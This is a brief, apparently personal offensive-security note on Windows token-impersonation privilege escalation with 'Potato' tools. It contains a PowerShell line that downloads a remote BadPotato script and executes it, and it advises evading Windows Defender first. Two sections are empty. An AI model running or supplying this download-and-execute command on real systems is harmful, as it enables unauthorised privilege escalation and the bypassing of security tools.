# Privilege Escalation: Token Impersonate

## How it work

This technique based on some methods to duplicate then impersonate another user's existing token to escalate privileges and bypass access controls.

## Requirement

- Almost every techniques need `SeImpersonatePrivilege` on current user
- Unfortunately, most techniques is detected by modern AV like Windows Defender, so you should try some method from [Defense Evasion]() before running below scripts

## Methods

There are plenty techniques that still exist ( or Potato, I don't know why they name it like that ) for us to use:
 
#### BadPotato

- We can get PE binary by building it from repo [BadPotato](https://github.com/BeichenDream/BadPotato)
- Or using powershell script like this:
```powershell
iex (iwr "https://raw.githubusercontent.com/Zanitas404/Invoke-BadPotato/refs/heads/main/Invoke-BadPotato.ps1" -UseBasicParsing).Content
Invoke-BadPotato "whoami"
```

#### GodPotato
#### DeadPotato

I'm lazy now so just using BadPotato is enough, maybe I will update this in some day